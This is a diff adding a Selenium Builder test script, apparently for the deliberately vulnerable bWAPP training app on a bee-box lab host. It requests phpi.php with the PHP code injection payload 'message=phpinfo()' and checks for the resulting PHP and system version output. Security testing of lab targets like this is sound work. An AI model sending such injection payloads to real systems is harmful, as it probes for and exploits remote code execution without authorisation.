@@ -1,0 +1,28 @@
+{
+  "type": "script",
+  "seleniumVersion": "2",
+  "formatVersion": 2,
+  "steps": [
+    {
+      "type": "clickElement",
+      "locator": {
+        "type": "link text",
+        "value": "message"
+      }
+    },
+    {
+      "type": "get",
+      "url": "http://192.168.178.43/bWAPP/phpi.php?message=phpinfo()"
+    },
+    {
+      "type": "verifyTextPresent",
+      "text": "PHP Version 5.2.4-2ubuntu5 System Linux bee-box 2.6.24-16-generic #1 SMP Thu Apr 10 13:23:42 UTC 2008 i686 Build Date Feb 27 2008 20:27:58 Server API Apache 2.0 Handler Virtual Directory Support"
+    }
+  ],
+  "data": {
+    "configs": {},
+    "source": "none"
+  },
+  "inputs": [],
+  "timeoutSeconds": 60
+}
